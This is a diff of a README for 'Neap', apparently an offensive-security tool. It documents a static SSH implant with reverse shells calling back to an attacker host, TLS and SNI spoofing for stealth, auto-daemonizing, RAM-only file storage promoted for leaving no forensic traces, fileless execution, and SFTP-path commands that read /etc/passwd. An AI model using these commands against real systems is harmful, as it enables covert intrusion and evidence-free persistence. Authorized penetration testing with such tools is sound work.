@@ -1,26 +1,44 @@
-<div align="center">
-
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg">
   <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-light.svg">
-  <img alt="Neap" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg" width="520">
+  <img alt="Neap" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg" width="100%">
 </picture>
 
-![Rust](https://img.shields.io/badge/language-Rust-orange.svg)
-![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
-![License](https://img.shields.io/badge/license-GPLv3-blue.svg)
+> [!IMPORTANT]
+> **Statically-linked SSH server for penetration testing.** Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, build-time configuration, auto-daemonization, in-memory SFTP, and SFTP shell via `/exec/`.
 
-**Statically-linked SSH server for penetration testing.**
-
-Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, build-time configuration, auto-daemonization, in-memory SFTP, and SFTP shell via `/exec/`.
-
-> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.
-
-</div>
+> *A neap tide is when high and low water marks are closest — minimal difference, low energy, calm waters. Felt fitting for a tool that operates quietly in the background, maintaining persistent SSH access with minimal detection footprint.*
 
 ---
 
-## Quick Start
+## §1 / Premise
+
+Neap is a **statically-linked SSH server** designed for penetration testing. It provides reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. This Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) adds **TLS wrapping**, **SNI spoofing**, **build-time configuration**, and **auto-daemonization**.
+
+Key innovations include **in-memory SFTP** with zero disk artifacts, **SFTP shell** via `/exec/` paths for command execution through any standard SFTP client, and **fileless execution** using `memfd_create()` on Linux. Build-time configuration bakes connection parameters at compile time — no runtime arguments needed on target.
+
+**Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.
+
+---
+
+## §2 / Specs
+
+| KEY        | VALUE                                                                       |
+|------------|-----------------------------------------------------------------------------|
+| SHELLS     | **Reverse/bind** · PTY support (Linux openpty/Windows ConPTY)               |
+| TRANSPORT  | **SSH-2.0 protocol** · TLS wrapping · SNI spoofing · build-time config      |
+| SFTP       | **Disk + in-memory** · upload/download · zero forensic artifacts (memfs)    |
+| FORWARDING | **Local/remote/dynamic** · SOCKS5 proxy · full SSH tunnel capabilities      |
+| EXECUTION  | **SFTP shell** via `/exec/` · fileless execution · memfd_create on Linux    |
+| PLATFORM   | **Linux/Windows** · static binary · musl/MSVC · cross-compile support      |
+| STEALTH    | **Auto-daemonize** · TLS HTTPS blending · minimal detection footprint      |
+| STACK      | **Rust 1.75+** · static linking · GPLv3                                    |
+
+Architecture in §5 below.
+
+---
+
+## §3 / Quickstart
 
 **Prerequisites:** Rust 1.75+, Cargo
 
@@ -73,141 +91,96 @@ The output binary is written to `bin/neap_<host>_<port>.exe`.
 
 ---
 
-## Features
+## §4 / Reference
 
-### Reverse Shell
-
-Dial home to attacker with full PTY support. Linux openpty and Windows ConPTY.
-
-```bash
-neap 192.168.1.10
-neap -p 31337 kali@192.168.1.10
 ```
+BUILD METHODS
 
-### Bind Shell
+  make current                    Build for current platform
+  ./build.sh reverse <host:port>  Reverse shell (dials home)
+  ./build.sh listen <port>        Bind shell (listens)
+  --tls                          TLS wrapping with SNI spoofing
+  --password <pass>              Auth password (baked at compile time)
+  --memfs                        In-memory SFTP, zero disk artifacts
+  --nocli                        Minimal binary, no help/version
+  --compress                     UPX compression
+  --target <triple>              Cross-compile (e.g., x86_64-pc-windows-gnu)
 
-Listen for incoming SSH connections. Runs in the foreground with logging enabled so you see connections arrive.
+RUNTIME USAGE
 
-```bash
-neap -l -p 4444
-neap -v -l -p 4444   # extra verbose
-```
+  neap <host>                    Reverse shell
+  neap -p <port> <host>          Reverse shell on port
+  neap -l -p <port>              Bind shell (listen)
+  neap --memfs -l -p <port>      In-memory SFTP
+  neap -v                        Verbose logging
 
-### SFTP File Transfer
+SSH FEATURES
 
-Full SFTP subsystem for file upload and download over the SSH channel.
+  Shells        Reverse/bind with PTY (openpty/ConPTY)
+  SFTP          File transfer + /exec/ shell via paths
+  Forwarding    Local/remote/dynamic SOCKS5
+  TLS           Optional wrapper, SNI spoofing
+  Memfs         RAM-only storage, zero forensics
 
-```bash
-sftp -P 4444 user@target
-```
+SFTP SHELL
 
-### Port Forwarding
+  sftp> get /exec/whoami /dev/stdout
+  sftp> get "/exec/cat /etc/passwd" /dev/stdout
+  nexec user@target:4444 "command"    # Helper script
 
-Local, remote, and dynamic (SOCKS5) forwarding through the SSH tunnel.
+FILELESS EXECUTION
 
-```bash
-# Local forward
-ssh -L 8080:internal:80 -p 4444 user@target
+  sftp> put payload /tmp/payload      # Upload to RAM
+  nexec user@target:4444 "/tmp/payload"    # Execute from memfd
 
-# Dynamic SOCKS5
-ssh -D 1080 -p 4444 user@target
-```
+CROSS-COMPILE SETUP
 
-### TLS Wrapping
-
-Wrap SSH traffic in TLS with SNI spoofing. Blends with normal HTTPS traffic.
-
-```bash
-./build.sh reverse 10.10.14.5:443 --tls
-```
-
-### Build-Time Configuration
-
-All connection parameters baked at compile time. No runtime arguments needed on target.
-
-```bash
-./build.sh reverse 10.10.14.5:443 --password "s3cret" --tls
-# Produces a binary that auto-connects with no flags needed
-```
-
-### SFTP Shell (`/exec/`)
-
-Execute commands through any SFTP client — no SSH shell access needed. Access paths under `/exec/` and Neap runs the command, returning output as file content.
-
-```bash
-sftp -P 4444 user@target
-sftp> get /exec/whoami /dev/stdout
-sftp> get "/exec/cat /etc/passwd" /dev/stdout
-sftp> get /exec/ipconfig /dev/stdout
-```
-
-Works with any standard SFTP client (OpenSSH, WinSCP, FileZilla, scp, curl). No custom tooling required.
-
-**`nexec` helper** — simplified command execution from the attacker side:
-
-```bash
-nexec user@target:4444 "whoami"
-nexec user@target:4444 "cat /etc/passwd"
-```
-
-### Fileless Execution (memfs + /exec/)
-
-Upload a binary via in-memory SFTP, then execute it without touching disk:
-
-```bash
-sftp> put payload /tmp/payload
-nexec user@target:4444 "/tmp/payload"
-```
-
-On Linux, uses `memfd_create()` — the binary runs from RAM via `/proc/self/fd/`. Zero disk artifacts. Windows falls back to a temp file that is deleted immediately after execution.
-
-### Auto-Daemonize
-
-Reverse mode (on target) automatically backgrounds itself — Unix double-fork with full terminal detach, Windows detached process respawn. No visible output on the target.
-
-Bind/listen mode (attacker side) runs in the foreground with logging enabled so you can see connections arrive and get callback info.
-
-### In-Memory SFTP
-
-RAM-only file storage with `--memfs`. Files never touch disk — zero forensic artifacts. All data lost on exit, by design.
-
-```bash
-neap --memfs -l -p 4444
-./build.sh reverse 10.10.14.5:443 --memfs
+  rustup target add x86_64-pc-windows-gnu    # Windows x64
+  rustup target add i686-pc-windows-gnu      # Windows x86
+  sudo apt install mingw-w64                 # Cross-compiler
 ```
 
 ---
 
-## Architecture
+## §5 / Architecture
 
 ```
 src/
-├── main.rs          # Entry point, CLI parsing, daemonization
-├── config.rs        # Build-time configuration constants
-├── daemon.rs        # Auto-daemonize (Unix double-fork / Windows detach)
-├── transport.rs     # Bind and reverse mode connection logic, TLS wrapping
-├── server.rs        # SSH server handler, authentication, channel dispatch
-├── session.rs       # Command execution, environment setup
-├── pty/             # PTY handling
-│   ├── unix.rs      # Linux openpty
-│   └── windows.rs   # Windows ConPTY
-├── sftp.rs          # SFTP subsystem (disk-backed)
-├── memfs.rs         # In-memory filesystem for memsftp
-├── memsftp.rs       # SFTP subsystem (RAM-only, no disk artifacts)
-├── exec.rs          # /exec/ SFTP shell — run commands via SFTP paths
-├── forwarding.rs    # Local, remote, and dynamic port forwarding
-├── info.rs          # System info gathering (reverse mode callback)
-└── error.rs         # Error types
+├── main.rs          Entry point, CLI parsing, daemonization
+├── config.rs        Build-time configuration constants
+├── daemon.rs        Auto-daemonize (Unix double-fork / Windows detach)
+├── transport.rs     Bind and reverse mode connection logic, TLS wrapping
+├── server.rs        SSH server handler, authentication, channel dispatch
+├── session.rs       Command execution, environment setup
+├── pty/             PTY handling
+│   ├── unix.rs      Linux openpty
+│   └── windows.rs   Windows ConPTY
+├── sftp.rs          SFTP subsystem (disk-backed)
+├── memfs.rs         In-memory filesystem for memsftp
+├── memsftp.rs       SFTP subsystem (RAM-only, no disk artifacts)
+├── exec.rs          /exec/ SFTP shell — run commands via SFTP paths
+├── forwarding.rs    Local, remote, and dynamic port forwarding
+├── info.rs          System info gathering (reverse mode callback)
+└── error.rs         Error types
 ```
 
-Two-mode architecture: bind (server listens) or reverse (client dials home). Both share the same SSH session layer with pluggable subsystems for shell, SFTP, and forwarding. TLS wrapping is transparent and optional.
+| Layer        | Implementation                                                  |
+|--------------|-----------------------------------------------------------------|
+| **Modes**    | Bind (server listens) · reverse (client dials home)             |
+| **Session**  | Shared SSH-2.0 layer · pluggable subsystems                     |
+| **Transport**| TLS wrapping · SNI spoofing · build-time configuration          |
+| **SFTP**     | Disk-backed + in-memory · `/exec/` shell integration            |
+| **Execution**| PTY shells · fileless via memfd · auto-daemonize                |
+| **Build**    | Static linking · cross-compile · UPX compression                |
+
+**Key patterns:** Two-mode architecture with shared SSH session layer. TLS wrapping is transparent and optional. Build-time configuration eliminates runtime arguments. In-memory SFTP provides zero-disk-artifact operation.
 
 ---
 
-## Platform Support
+## §6 / Platform Support
 
-| | Linux | Windows |
-|---|---|---|
+| Capability | Linux | Windows |
+|------------|-------|---------|
 | Reverse Shell | Full (PTY) | Full (ConPTY) |
 | Bind Shell | Full (PTY) | Full (ConPTY) |
 | SFTP | Full | Full |
@@ -221,18 +194,4 @@ Two-mode architecture: bind (server listens) or reverse (client dials home). Bot
 
 ---
 
-## Security
-
-Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Neap/security/advisories). 90-day responsible disclosure.
-
-**Neap does not:**
-- Manage implant networks or tasking (not a C2)
-- Generate exploits or payloads (not a framework)
-- Destroy evidence or tamper with logs (not anti-forensics)
-- Evade EDR behavioral detection (not evasion tooling)
-
----
-
-## License
-
-[GPLv3](LICENSE) — Copyright 2026 Real-Fruit-Snacks
+[License: GPLv3](LICENSE) · Part of [Real-Fruit-Snacks](https://github.com/Real-Fruit-Snacks) — building offensive security tools, one wave at a time.
